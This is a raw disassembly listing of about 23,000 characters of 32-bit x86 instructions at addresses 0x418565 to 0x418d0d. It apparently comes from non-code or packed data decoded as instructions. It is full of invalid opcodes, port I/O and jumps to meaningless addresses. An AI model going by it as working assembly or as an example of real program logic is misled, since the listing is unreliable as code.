  418565:	sti    
  418566:	mov    al,ds:0x1828895b
  41856b:	enter  0x7fac,0x3e
  41856f:	cmp    al,BYTE PTR [ecx-0x67]
  418572:	mov    ecx,0x4c1f5eb5
  418577:	popf   
  418578:	das    
  418579:	adc    cl,BYTE PTR [esi+edx*8]
  41857c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41857d:	mov    bh,0xff
  41857f:	fstp   TBYTE PTR [ebp-0x28a98e15]
  418585:	push   edx
  418586:	imul   edi,DWORD PTR [ecx+0x5],0xab4beacc
  41858d:	xor    cl,dh
  41858f:	add    ecx,edi
  418591:	mov    edi,0x9c91e1cd
  418596:	daa    
  418597:	mov    dl,0xd1
  418599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41859a:	std    
  41859b:	jecxz  0x4185c3
  41859d:	mov    ds:0xe0a38133,eax
  4185a2:	adc    cl,al
  4185a4:	(bad)  [eax-0xc]
  4185a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185a8:	fimul  WORD PTR [edi]
  4185aa:	jmp    0x6e08a2f6
  4185af:	dec    ebp
  4185b0:	hlt    
  4185b1:	aam    0x24
  4185b3:	(bad)  
  4185b4:	pop    edi
  4185b5:	pop    edi
  4185b6:	add    ecx,DWORD PTR [esi+0x63]
  4185b9:	mov    ah,0x1e
  4185bb:	imul   ebp,DWORD PTR [ebx],0xae3e6cb4
  4185c1:	mov    bh,0x2e
  4185c3:	push   ss
  4185c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185c5:	xor    DWORD PTR [edx],esp
  4185c7:	push   es
  4185c8:	repnz sbb BYTE PTR [esi-0x72523d10],0x6f
  4185d0:	les    ebp,FWORD PTR [edi+0x21]
  4185d3:	push   edx
  4185d4:	in     eax,dx
  4185d5:	and    BYTE PTR [ebx+eax*4],ch
  4185d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185d9:	sti    
  4185da:	add    edx,DWORD PTR [esi]
  4185dc:	in     al,0x9b
  4185de:	lods   al,BYTE PTR ds:[esi]
  4185df:	rcl    DWORD PTR [eax-0x5f5d8251],1
  4185e5:	or     eax,DWORD PTR [eax+0x6dbcdf77]
  4185eb:	and    dl,BYTE PTR [ebx-0x49]
  4185ee:	push   es
  4185ef:	ja     0x41858e
  4185f1:	xor    al,BYTE PTR [esi+0x6b]
  4185f4:	enter  0xbf9b,0xc5
  4185f8:	push   ds
  4185f9:	sub    ch,BYTE PTR ds:0x5694171c
  4185ff:	jne    0x4185f6
  418601:	arpl   WORD PTR [edx+0x65],di
  418604:	int3   
  418605:	xor    al,0x22
  418607:	(bad)  
  418608:	pop    ss
  418609:	pop    ebp
  41860a:	xchg   esi,eax
  41860b:	mov    al,ds:0x659b4919
  418610:	mov    ebx,0xd3cd6c31
  418615:	sub    DWORD PTR [edx],0x7eaecbd9
  41861b:	sbb    eax,0x9ced5dea
  418620:	sbb    al,0xf0
  418622:	addr16 jmp 0x36f4:0x497f114f
  41862a:	xchg   ebx,eax
  41862b:	inc    esi
  41862c:	or     eax,0x91cc7709
  418631:	jmp    0x418622
  418633:	xor    bl,BYTE PTR [esi]
  418635:	sbb    edx,DWORD PTR [eax+0x71]
  418638:	sbb    ebp,edi
  41863a:	mov    esi,esi
  41863c:	pusha  
  41863d:	jle    0x4186b4
  41863f:	mov    edi,0x208ea3ef
  418644:	jbe    0x4186ad
  418646:	mov    BYTE PTR ds:0xc32ee53,dl
  41864c:	es push ecx
  41864e:	pusha  
  41864f:	jmp    0x99c94993
  418654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418655:	xchg   esp,eax
  418656:	sub    BYTE PTR [ebx],0xa2
  418659:	and    DWORD PTR [edi+0x57d17c37],0xc023b475
  418663:	call   0xe6256726
  418668:	retf   0x5701
  41866b:	jo     0x4186e6
  41866d:	pop    ds
  41866e:	in     eax,0xb5
  418670:	outs   dx,DWORD PTR ds:[esi]
  418671:	fmulp  st(4),st
  418673:	fist   DWORD PTR fs:[edx-0x6bb60d5a]
  41867a:	hlt    
  41867b:	add    eax,0x151b8822
  418680:	jne    0x4186e8
  418682:	out    0x86,eax
  418684:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418685:	jo     0x4186fe
  418687:	ret    0xa728
  41868a:	cmc    
  41868b:	cmp    eax,0x8741fb30
  418690:	sub    dh,cl
  418692:	mov    esp,0x8fc73715
  418697:	push   ecx
  418698:	fidiv  WORD PTR [eax]
  41869a:	call   0x39203f15
  41869f:	fwait
  4186a0:	xchg   esp,edi
  4186a2:	jbe    0x4186ec
  4186a4:	aaa    
  4186a5:	mov    bl,0xfb
  4186a7:	mov    edx,0x596ecece
  4186ac:	dec    edx
  4186ad:	retw   
  4186af:	and    al,0x9c
  4186b1:	mov    ds:0xba995390,eax
  4186b6:	pop    eax
  4186b7:	mov    ds:0xbaee4a3,eax
  4186bd:	mov    al,0x8e
  4186bf:	rcl    DWORD PTR [ebx],0x5a
  4186c2:	retf   0x8e8a
  4186c5:	aaa    
  4186c6:	imul   edx,DWORD PTR [ecx-0x4d5b5077],0xe586fabd
  4186d0:	aaa    
  4186d1:	dec    ebx
  4186d2:	pop    edx
  4186d3:	cwde   
  4186d4:	xor    cl,BYTE PTR [esi]
  4186d6:	out    0xd8,al
  4186d8:	retf   0x683c
  4186db:	sub    eax,0x4972a2d8
  4186e0:	dec    edi
  4186e1:	mov    gs,edx
  4186e3:	cld    
  4186e4:	(bad)  
  4186e5:	loopne 0x4186b6
  4186e7:	(bad)  
  4186e8:	pop    esp
  4186e9:	ret    
  4186ea:	jl     0x418750
  4186ec:	ins    DWORD PTR es:[edi],dx
  4186ed:	dec    edx
  4186ee:	dec    edx
  4186ef:	out    dx,eax
  4186f0:	clc    
  4186f1:	sbb    DWORD PTR [edi],edx
  4186f3:	sbb    ebx,eax
  4186f5:	outs   dx,BYTE PTR ds:[esi]
  4186f6:	cmp    dl,BYTE PTR [ebx-0x2c2c1925]
  4186fc:	sub    al,0xcc
  4186fe:	sub    al,0xa3
  418700:	or     eax,0xf1eea0e5
  418705:	outs   dx,DWORD PTR ds:[esi]
  418706:	jmp    0x4186b1
  418708:	outs   dx,BYTE PTR ds:[esi]
  418709:	xor    eax,0xdf01f609
  41870e:	cmp    dh,BYTE PTR [esi-0x13]
  418711:	hlt    
  418712:	push   0xffffffa7
  418714:	cmp    BYTE PTR [edx],ch
  418716:	fcmovnb st,st(5)
  418718:	inc    edi
  418719:	stos   BYTE PTR es:[edi],al
  41871a:	add    cl,BYTE PTR fs:[esi-0x2fcfd1eb]
  418721:	sahf   
  418722:	fcomp  DWORD PTR [ebp-0x10fcba77]
  418728:	nop
  418729:	adc    eax,0xb663fd6e
  41872e:	jecxz  0x41873e
  418730:	inc    esi
  418731:	fs pop ebp
  418733:	retf   0x74f5
  418736:	addr16 push ebx
  418738:	das    
  418739:	scas   al,BYTE PTR es:[edi]
  41873a:	adc    esp,edi
  41873c:	out    dx,eax
  41873d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41873e:	ins    BYTE PTR es:[edi],dx
  41873f:	push   edi
  418740:	rcl    BYTE PTR [ecx+edi*2-0x19],1
  418744:	push   es
  418745:	sub    esp,DWORD PTR [ecx]
  418747:	or     dl,BYTE PTR [edx+0x1a96a306]
  41874d:	fisttp DWORD PTR [eax+0x2cf815e9]
  418753:	mov    bh,0x4c
  418755:	imul   BYTE PTR [ecx]
  418757:	pop    esp
  418758:	push   ecx
  418759:	test   BYTE PTR [esi],0x3b
  41875c:	(bad)  
  41875d:	mov    edi,0xc55ba7f3
  418762:	or     eax,0x271307c8
  418767:	and    DWORD PTR [esi],eax
  418769:	popf   
  41876a:	test   BYTE PTR [eax+0x4],dl
  41876d:	out    0x4a,eax
  41876f:	std    
  418770:	aam    0x32
  418772:	cmp    DWORD PTR [ecx-0x6007b0bf],esp
  418778:	frstor [eax-0x63]
  41877b:	inc    esp
  41877c:	loopne 0x4187e8
  41877e:	stos   DWORD PTR es:[edi],eax
  41877f:	out    dx,eax
  418780:	xor    DWORD PTR [eax+0xf],edx
  418783:	xchg   ecx,eax
  418784:	outs   dx,BYTE PTR gs:[esi]
  418786:	mov    al,ds:0x7f6d16fa
  41878b:	xchg   ebp,eax
  41878c:	jne    0x4187db
  41878e:	pop    ebp
  41878f:	bound  edi,QWORD PTR [esi+0x5669f395]
  418795:	or     DWORD PTR [eax+0x1f08f0c3],eax
  41879b:	jb     0x4187b8
  41879d:	ja     0x418720
  41879f:	fwait
  4187a0:	mov    DWORD PTR [esi-0x1c],ebp
  4187a3:	lock adc esi,eax
  4187a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187a7:	retf   0x3865
  4187aa:	leave  
  4187ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187ac:	sub    eax,0xa8905eb0
  4187b1:	jb     0x4187d7
  4187b3:	ror    BYTE PTR [ecx+0x1e],cl
  4187b6:	mov    cl,0xa5
  4187b8:	mov    bh,0x6e
  4187ba:	inc    ebx
  4187bb:	jmp    0x41878a
  4187bd:	dec    ebx
  4187be:	nop
  4187bf:	idiv   BYTE PTR [ecx]
  4187c1:	add    BYTE PTR [esi+0x46b6db8d],al
  4187c7:	mov    esp,0x768b0ffc
  4187cc:	test   al,ch
  4187ce:	inc    esp
  4187cf:	pop    ss
  4187d0:	push   eax
  4187d1:	xchg   esp,eax
  4187d2:	cmp    eax,eax
  4187d4:	icebp  
  4187d5:	mov    DWORD PTR [ecx-0x54],eax
  4187d8:	mov    ebp,0x8c0d8c0d
  4187dd:	push   cs
  4187de:	sti    
  4187df:	jmp    0xc8e0:0x27a04cc3
  4187e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e7:	mov    al,0x41
  4187e9:	imul   edi,DWORD PTR [edi+eiz*2+0x42],0x7166ff90
  4187f1:	dec    esi
  4187f2:	fnsave [ecx]
  4187f4:	in     eax,0x3b
  4187f6:	les    esp,FWORD PTR [edx+ebx*8]
  4187f9:	push   es
  4187fa:	call   0x2f8a:0x8caf231b
  418801:	mov    dh,0x89
  418803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418804:	push   es
  418805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418806:	jns    0x418851
  418808:	mov    al,0xde
  41880a:	xchg   edi,eax
  41880b:	sbb    edx,DWORD PTR [bx+di+0x6919]
  418810:	adc    DWORD PTR ds:0x29780b9b,0x42
  418817:	in     eax,dx
  418818:	(bad)  
  41881a:	imul   ebp,DWORD PTR es:[ecx+esi*8],0x8a3cfb16
  418822:	sub    DWORD PTR [eax],edx
  418824:	lock jb 0x41880a
  418827:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418828:	sti    
  418829:	xchg   ebp,eax
  41882a:	fwait
  41882b:	sbb    al,0x53
  41882d:	jnp    0x418851
  41882f:	arpl   WORD PTR [edx-0xb],cx
  418832:	loope  0x418819
  418834:	xor    esi,DWORD PTR [esi]
  418836:	test   BYTE PTR [ebx],dh
  418838:	mov    ds:0x9f8963ca,eax
  41883d:	xchg   edx,eax
  41883e:	xchg   esp,eax
  41883f:	aam    0xb1
  418841:	fldcw  WORD PTR [ecx]
  418843:	mov    edx,0xebce93dd
  418848:	mov    WORD PTR [eax+0x47],ss
  41884b:	cmp    ebx,esp
  41884d:	mov    cs,WORD PTR [eax+ecx*8+0x28]
  418851:	jecxz  0x418841
  418853:	mov    ebp,0x70b361b4
  418858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418859:	ins    DWORD PTR es:[edi],dx
  41885a:	xor    DWORD PTR [edi],0x20737d7b
  418860:	out    dx,al
  418861:	xor    eax,0x458a86f0
  418866:	popf   
  418867:	je     0x4188b3
  418869:	dec    edx
  41886a:	outs   dx,DWORD PTR ds:[esi]
  41886b:	xchg   edi,eax
  41886c:	jp     0x4188e8
  41886e:	or     esi,DWORD PTR [edx+edi*2+0x12932d6d]
  418875:	pusha  
  418876:	(bad)  
  418877:	adc    ch,BYTE PTR [ebp+esi*8+0x26]
  41887b:	pop    eax
  41887c:	popa   
  41887d:	xor    DWORD PTR [ebp+0x3958e0f7],0x9ea82545
  418887:	push   0xfffffffe
  418889:	mov    eax,0x864a21e3
  41888e:	inc    eax
  41888f:	outs   dx,BYTE PTR ds:[esi]
  418890:	or     al,0xdb
  418892:	adc    edi,DWORD PTR [edx+0x72]
  418895:	jbe    0x4188e4
  418897:	pop    ebx
  418898:	push   esp
  418899:	addr16 mov dl,0x13
  41889c:	out    dx,al
  41889d:	lds    ecx,FWORD PTR [edi+0x1c]
  4188a0:	sub    DWORD PTR [ecx-0x1f],ebx
  4188a3:	jns    0x418850
  4188a5:	and    ah,BYTE PTR [ecx]
  4188a7:	out    dx,al
  4188a8:	fcomp  QWORD PTR ds:0x83117fcc
  4188ae:	ds mov esi,0xde6f86e1
  4188b4:	push   cs
  4188b5:	(bad)  
  4188b6:	cmp    eax,edi
  4188b8:	in     al,dx
  4188b9:	ja     0x418920
  4188bb:	sbb    DWORD PTR [ecx+0x1f127e1f],0x14
  4188c2:	adc    esp,edx
  4188c4:	outs   dx,BYTE PTR ds:[esi]
  4188c5:	or     DWORD PTR [ecx-0x36c25d17],ebp
  4188cb:	pop    ds
  4188cc:	jno    0x418882
  4188ce:	ror    BYTE PTR [eax],cl
  4188d0:	imul   edi,DWORD PTR [edi],0xa2235603
  4188d6:	pop    esp
  4188d7:	xchg   esi,eax
  4188d8:	jb     0x418931
  4188da:	sub    eax,0xe082f217
  4188df:	add    al,0xf4
  4188e1:	xchg   DWORD PTR [ecx-0x231550e2],esi
  4188e7:	dec    BYTE PTR [ebp+0x59745fc3]
  4188ed:	mov    WORD PTR [edx],cs
  4188ef:	xor    dx,dx
  4188f2:	jg     0x41896f
  4188f4:	pop    ebp
  4188f5:	out    0x5e,al
  4188f7:	jb     0x41892f
  4188f9:	mov    ah,0x48
  4188fb:	adc    eax,0xaccfa834
  418900:	leave  
  418901:	pop    ebp
  418902:	push   ebx
  418903:	fwait
  418904:	push   ecx
  418905:	out    dx,eax
  418906:	ret    0x8e0f
  418909:	retf   
  41890a:	xor    al,BYTE PTR [edx-0xb]
  41890d:	pop    edx
  41890e:	lock mov dh,0x50
  418911:	ins    DWORD PTR es:[edi],dx
  418912:	data16 (bad) 
  418914:	dec    ebp
  418915:	and    BYTE PTR gs:[edx],ch
  418918:	or     al,0xea
  41891a:	dec    ebp
  41891b:	(bad)  
  41891c:	iret   
  41891d:	idiv   DWORD PTR [ebp-0x61645b93]
  418923:	jo     0x4188a5
  418925:	ror    dl,0xc
  418928:	pushf  
  418929:	cmp    DWORD PTR [ecx],eax
  41892b:	adc    al,0x7c
  41892d:	lods   al,BYTE PTR ds:[esi]
  41892e:	sbb    bl,al
  418930:	pop    ebx
  418931:	imul   esp,DWORD PTR [edi-0x15],0xffffffef
  418935:	add    dh,ah
  418937:	pushf  
  418938:	cwde   
  418939:	enter  0x9203,0x36
  41893d:	jmp    0x3784:0xa5b6acda
  418944:	or     al,0xd7
  418946:	jge    0x4188d9
  418948:	test   eax,0xaee03305
  41894d:	pop    ebp
  41894e:	dec    esi
  41894f:	pop    ss
  418950:	retf   
  418951:	inc    edx
  418952:	rcr    BYTE PTR [ebx+edi*8-0x5e],1
  418956:	fmul   QWORD PTR [ebx+0x7b]
  418959:	fimul  WORD PTR [ebp+0x73]
  41895c:	cmp    al,0x3d
  41895e:	sub    DWORD PTR [ebp+0x5],edi
  418961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418962:	das    
  418963:	arpl   WORD PTR [ebp-0x609257fc],si
  418969:	pop    edi
  41896a:	adc    dh,dl
  41896c:	or     eax,0x19bd24b5
  418971:	adc    al,0x68
  418973:	push   ecx
  418974:	(bad)  
  418975:	mov    esi,0xd1065da9
  41897a:	and    BYTE PTR gs:[ebp+ebp*4-0x2e361aa5],bh
  418982:	sbb    bh,0xf6
  418985:	xchg   esi,eax
  418986:	push   0x3a2b4c3a
  41898b:	jno    0x41894c
  41898d:	imul   edx,ebp,0x62dc3556
  418993:	xchg   ebx,eax
  418994:	xchg   edx,eax
  418995:	mov    eax,?
  418997:	leave  
  418998:	das    
  418999:	xchg   DWORD PTR [edx+eax*2+0x5f5653a5],esp
  4189a0:	std    
  4189a1:	xchg   edi,eax
  4189a2:	in     eax,0x79
  4189a4:	mov    DWORD PTR gs:[edi],ebp
  4189a7:	push   esi
  4189a8:	inc    BYTE PTR [esp+ebp*4+0x2194e416]
  4189af:	hlt    
  4189b0:	rcl    BYTE PTR [edi-0x76fe018d],0x93
  4189b7:	inc    eax
  4189b8:	or     eax,0x38084795
  4189bd:	push   cs
  4189be:	push   ecx
  4189bf:	stos   BYTE PTR es:[edi],al
  4189c0:	cli    
  4189c1:	stc    
  4189c2:	(bad)  
  4189c3:	push   edx
  4189c4:	imul   esp,DWORD PTR [ebx+0x43f0187b],0x470c3ed8
  4189ce:	ret    
  4189cf:	push   ebp
  4189d0:	dec    ebx
  4189d1:	fcom   QWORD PTR [ebx]
  4189d3:	retf   0x7f62
  4189d6:	mul    DWORD PTR [ecx+0x345b2e7a]
  4189dc:	inc    edx
  4189dd:	push   eax
  4189de:	push   edi
  4189df:	nop
  4189e0:	dec    ebp
  4189e1:	ror    BYTE PTR cs:[edx+0x20],1
  4189e5:	xor    BYTE PTR [ebx+0x5ec789d3],0x6f
  4189ec:	add    ebx,ecx
  4189ee:	test   eax,0x50306e9a
  4189f3:	dec    esi
  4189f4:	out    0x20,eax
  4189f6:	push   esi
  4189f7:	aaa    
  4189f8:	(bad)  
  4189f9:	lock in al,dx
  4189fb:	into   
  4189fc:	and    eax,0x3fb456c1
  418a01:	jl     0x4189d3
  418a03:	push   ebp
  418a04:	mov    ah,0xb1
  418a06:	dec    esp
  418a07:	sar    ebx,0xc8
  418a0a:	or     al,0x8e
  418a0c:	dec    BYTE PTR [edi]
  418a0e:	fucom  st(6)
  418a10:	cld    
  418a11:	dec    ebx
  418a12:	leavew 
  418a14:	fucomi st,st(3)
  418a16:	(bad)  
  418a17:	mov    ebx,0xdc7ae37a
  418a1c:	mov    edx,0x77f42419
  418a21:	test   BYTE PTR [esp+ebp*4],bh
  418a24:	loope  0x418a81
  418a26:	xor    BYTE PTR [edx+0x79],0x66
  418a2a:	fst    DWORD PTR [ecx+0x2335d3d3]
  418a30:	sbb    BYTE PTR cs:[edi-0x4d508942],cl
  418a37:	int    0x16
  418a39:	add    DWORD PTR [ebx+ebx*8+0xc969083],0xfffffff0
  418a41:	mov    eax,DWORD PTR [esp+edx*1+0x67]
  418a45:	fwait
  418a46:	pusha  
  418a47:	jp     0x4189de
  418a49:	jmp    0x4189d8
  418a4b:	inc    ebp
  418a4c:	pop    eax
  418a4d:	jmp    0x5741:0x48c891cf
  418a54:	jmp    0x95cb7edd
  418a59:	mov    WORD PTR [ebp-0x1b497c72],fs
  418a5f:	sbb    BYTE PTR [esi],cl
  418a61:	(bad)  
  418a62:	push   ds
  418a63:	xchg   ecx,eax
  418a64:	jecxz  0x418ad4
  418a66:	add    DWORD PTR [eax],edx
  418a68:	scas   eax,DWORD PTR es:[edi]
  418a69:	dec    edi
  418a6a:	sbb    BYTE PTR [esi+0x4cb77914],cl
  418a70:	or     esp,DWORD PTR [edx+0x39a86923]
  418a76:	pop    edx
  418a77:	or     DWORD PTR [edx+edx*2-0x5449f528],0xffffffbf
  418a7f:	push   ss
  418a80:	pop    ds
  418a81:	mov    dh,0xf6
  418a83:	cmc    
  418a84:	push   eax
  418a85:	or     al,0xc6
  418a87:	jb     0x418ae9
  418a89:	inc    edx
  418a8a:	pop    edi
  418a8b:	std    
  418a8c:	lds    ebp,FWORD PTR [eax+0x2e]
  418a8f:	mov    ecx,0x97673ea1
  418a94:	mov    ch,0x87
  418a96:	push   edi
  418a97:	cs pop esi
  418a99:	xor    ah,dl
  418a9b:	xor    ch,ch
  418a9d:	data16 fld QWORD PTR [ecx-0xf]
  418aa1:	xchg   edi,eax
  418aa2:	mov    bl,0x3e
  418aa4:	xchg   edx,eax
  418aa5:	add    edx,DWORD PTR [eax-0x55]
  418aa8:	test   eax,0x7b752fbb
  418aad:	xor    esi,DWORD PTR [eax]
  418aaf:	stos   BYTE PTR es:[edi],al
  418ab0:	cli    
  418ab1:	out    0x11,eax
  418ab3:	or     edx,esi
  418ab5:	lds    edx,FWORD PTR [eax-0x29ffbb4c]
  418abb:	cdq    
  418abc:	aas    
  418abd:	loope  0x418a4a
  418abf:	fidiv  WORD PTR [edi-0x4c]
  418ac2:	and    al,0x87
  418ac4:	gs ret 
  418ac6:	(bad)  
  418ac7:	mov    ebp,0xd38cc6d
  418acc:	into   
  418acd:	push   0x2131844c
  418ad2:	mov    bl,0xfe
  418ad4:	cs push ds
  418ad6:	(bad)  [esi+edi*4-0x221b253a]
  418add:	imul   esp,DWORD PTR [si],0xffffffdd
  418ae1:	xlat   BYTE PTR cs:[ebx]
  418ae3:	cli    
  418ae4:	mov    ecx,0xb30103d8
  418ae9:	rcr    DWORD PTR [edi],0x87
  418aec:	call   0x922a5d63
  418af1:	sbb    ecx,DWORD PTR [esi]
  418af3:	scas   eax,DWORD PTR es:[edi]
  418af4:	mov    al,ds:0x2e48d1d3
  418af9:	push   cs
  418afa:	mov    BYTE PTR [edx+0x42],cl
  418afd:	dec    ecx
  418afe:	add    DWORD PTR ds:0xed8df0,eax
  418b04:	cs icebp 
  418b06:	push   0xfffffffa
  418b08:	test   BYTE PTR [ecx+0x7f799a0b],dl
  418b0e:	popa   
  418b0f:	imul   BYTE PTR [ebx]
  418b11:	ret    0xfdb8
  418b14:	mov    ebp,0xcb793522
  418b19:	popf   
  418b1a:	fidivr DWORD PTR [eax]
  418b1c:	push   esp
  418b1d:	inc    ebx
  418b1e:	push   ebx
  418b1f:	xor    al,BYTE PTR [edi+0x6da5711d]
  418b25:	test   al,0x81
  418b27:	fimul  WORD PTR [esi]
  418b29:	sub    BYTE PTR [ebx+0x65],bl
  418b2c:	test   al,0xaf
  418b2e:	ins    BYTE PTR es:[edi],dx
  418b2f:	ins    DWORD PTR es:[edi],dx
  418b30:	jecxz  0x418ba4
  418b32:	xor    BYTE PTR [ebx+0x29],ch
  418b35:	sbb    DWORD PTR [ebx],edx
  418b37:	cmp    ch,BYTE PTR [esi]
  418b39:	push   esi
  418b3a:	ins    DWORD PTR es:[edi],dx
  418b3b:	popf   
  418b3c:	pop    ss
  418b3d:	adc    al,0xc
  418b3f:	dec    ebx
  418b40:	dec    ecx
  418b41:	enter  0x846b,0xb1
  418b45:	xor    ah,bl
  418b47:	out    dx,al
  418b48:	sub    eax,0x7f30532e
  418b4d:	sbb    dh,ch
  418b4f:	mov    BYTE PTR [ebx+ebx*4],bl
  418b52:	es std 
  418b54:	das    
  418b55:	fnstcw WORD PTR [eax+0x5678cf0f]
  418b5b:	inc    eax
  418b5c:	xchg   ebx,eax
  418b5d:	xchg   esi,eax
  418b5e:	stos   DWORD PTR es:[edi],eax
  418b5f:	add    DWORD PTR [ecx-0x74],ebx
  418b62:	jns    0x418b2e
  418b64:	int3   
  418b65:	sub    eax,0x71e18952
  418b6a:	sbb    al,0x63
  418b6c:	hlt    
  418b6d:	or     eax,0xc5dc4f69
  418b72:	ins    BYTE PTR es:[edi],dx
  418b73:	add    al,0xc9
  418b75:	jle    0x418b52
  418b77:	or     DWORD PTR [eax+0x46],0xfbbac95f
  418b7e:	(bad)  
  418b7f:	fdivr  DWORD PTR [eax]
  418b81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b82:	fimul  WORD PTR [edi-0x124fecfe]
  418b88:	mov    edx,0x2688f2fd
  418b8d:	and    eax,0x3227d502
  418b92:	add    ah,bl
  418b94:	jb     0x418b70
  418b96:	cmp    eax,0x2e69f1fd
  418b9b:	aas    
  418b9c:	pop    ecx
  418b9d:	ds ret 0xae
  418ba1:	xchg   edx,eax
  418ba2:	(bad)  
  418ba3:	retf   0x23bb
  418ba6:	enter  0xe560,0x6e
  418baa:	out    dx,al
  418bab:	test   BYTE PTR [edx],bl
  418bad:	enter  0x2d2e,0xed
  418bb1:	mov    BYTE PTR [ecx+0x51],dh
  418bb4:	and    DWORD PTR [ebp-0x7c],edx
  418bb7:	mov    al,0x20
  418bb9:	mov    al,0xb9
  418bbb:	sbb    eax,0xe42790ef
  418bc0:	mov    ebx,0x5a5b2b7
  418bc5:	ret    
  418bc6:	nop
  418bc7:	call   0x67ecd7d8
  418bcc:	pop    ecx
  418bcd:	rol    ebp,cl
  418bcf:	out    0x6f,eax
  418bd1:	retf   0xd54f
  418bd4:	int3   
  418bd5:	(bad)  
  418bd6:	mov    ds:0xe01fb0f5,eax
  418bdb:	pop    edx
  418bdc:	aad    0x7a
  418bde:	test   DWORD PTR [edx+0x4f],eax
  418be1:	push   0xb21e6b3a
  418be6:	stc    
  418be7:	sahf   
  418be8:	aas    
  418be9:	in     eax,dx
  418bea:	dec    esi
  418beb:	cmp    al,0xf0
  418bed:	cmc    
  418bee:	loope  0x418c11
  418bf0:	icebp  
  418bf1:	ffreep st(2)
  418bf3:	es dec ebx
  418bf5:	pop    edi
  418bf6:	(bad)  
  418bf7:	fucomip st,st(1)
  418bf9:	jl     0x418bf1
  418bfb:	out    0x9,eax
  418bfd:	(bad)  
  418bfe:	fwait
  418bff:	cdq    
  418c00:	test   al,0x31
  418c02:	adc    esp,ecx
  418c04:	sar    DWORD PTR [bx+si],cl
  418c07:	mov    ds:0x285967d3,eax
  418c0c:	pop    es
  418c0d:	xchg   ebx,eax
  418c0e:	mov    esp,DWORD PTR [esi+0x76c90859]
  418c14:	jne    0x418bfb
  418c16:	push   esi
  418c17:	pop    es
  418c18:	inc    esp
  418c19:	fld    TBYTE PTR [ecx-0x1b]
  418c1c:	mov    eax,ds:0xd016f5ea
  418c21:	in     eax,dx
  418c22:	jl     0x418c69
  418c24:	pop    eax
  418c25:	bound  esi,QWORD PTR [ebp-0x54]
  418c28:	pushf  
  418c29:	push   si
  418c2b:	xor    eax,0x99e152d3
  418c30:	call   0x1dd192ae
  418c35:	pop    esi
  418c36:	xchg   DWORD PTR [edx],eax
  418c38:	push   ds
  418c39:	xchg   ebx,eax
  418c3a:	dec    ebp
  418c3b:	mov    eax,ds:0x64c47e78
  418c41:	xchg   edi,edx
  418c43:	std    
  418c44:	or     al,BYTE PTR [eax]
  418c46:	inc    eax
  418c47:	jne    0x418c9c
  418c49:	inc    esp
  418c4a:	(bad)  
  418c4b:	in     eax,0xa2
  418c4d:	add    al,ah
  418c4f:	or     dl,BYTE PTR [edx-0x68]
  418c52:	shr    BYTE PTR [ebp+0x1d],1
  418c55:	mov    WORD PTR [eax],?
  418c57:	mov    ebx,DWORD PTR [esi+0x8]
  418c5a:	retf   
  418c5b:	fdivr  st(2),st
  418c5d:	add    eax,0x35fadec8
  418c62:	mov    ebp,0x5a3c0260
  418c67:	jno    0x418cab
  418c69:	push   ss
  418c6a:	jns    0x418bfb
  418c6c:	jle    0x418c7d
  418c6e:	ins    DWORD PTR es:[edi],dx
  418c6f:	add    dl,BYTE PTR [eax+edx*8-0x7b11c06e]
  418c76:	add    BYTE PTR [ebp+0x2dd22e82],0xc0
  418c7d:	mov    ds,WORD PTR [ebx+0x65cce8f9]
  418c83:	dec    eax
  418c84:	outs   dx,BYTE PTR ds:[esi]
  418c85:	xor    BYTE PTR [ebp-0x2b],cl
  418c88:	sub    edi,DWORD PTR [ebx]
  418c8a:	and    BYTE PTR ds:0xb28e9d5,dh
  418c90:	add    dh,ah
  418c92:	xor    BYTE PTR [edx+0x411d581],0x7f
  418c99:	fpatan 
  418c9b:	js     0x418cc5
  418c9d:	or     BYTE PTR [eax+0x3de165e4],0x3b
  418ca4:	(bad)  
  418ca5:	cli    
  418ca6:	or     DWORD PTR [edi-0x70],esi
  418ca9:	aas    
  418caa:	stc    
  418cab:	out    0xd1,al
  418cad:	in     al,0xd6
  418caf:	xor    ebx,DWORD PTR [ecx+0x2aaeb3c7]
  418cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cb6:	test   DWORD PTR [esi],0x21da758d
  418cbc:	jno    0x418cfc
  418cbe:	iret   
  418cbf:	xchg   BYTE PTR [edx],dh
  418cc1:	in     eax,0xba
  418cc3:	pop    edx
  418cc4:	mov    ecx,0x79350592
  418cc9:	out    0x64,eax
  418ccb:	cld    
  418ccc:	push   ebx
  418ccd:	push   ecx
  418cce:	fstp   QWORD PTR [esi]
  418cd0:	mov    al,ds:0xa7bed44c
  418cd5:	sar    DWORD PTR [edx-0x5d083f36],1
  418cdb:	dec    ebx
  418cdc:	adc    DWORD PTR [ebp+0x3820eb2a],edx
  418ce2:	jno    0x418d34
  418ce4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ce5:	stos   DWORD PTR es:[edi],eax
  418ce6:	test   al,0x94
  418ce8:	outs   dx,DWORD PTR ds:[esi]
  418ce9:	out    0xf9,al
  418ceb:	es inc ebp
  418ced:	xchg   DWORD PTR [ebx+eiz*4],ebx
  418cf0:	es loop 0x418d58
  418cf3:	int    0x7a
  418cf5:	push   edi
  418cf6:	and    al,BYTE PTR [edx]
  418cf8:	outs   dx,DWORD PTR ds:[esi]
  418cf9:	ins    BYTE PTR es:[edi],dx
  418cfa:	aad    0x41
  418cfc:	jmp    0xf2df:0x9846df64
  418d03:	and    al,0x7
  418d05:	jle    0x418d70
  418d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d08:	les    eax,FWORD PTR [eax+0x11]
  418d0b:	and    al,0x65
  418d0d:	pusha  
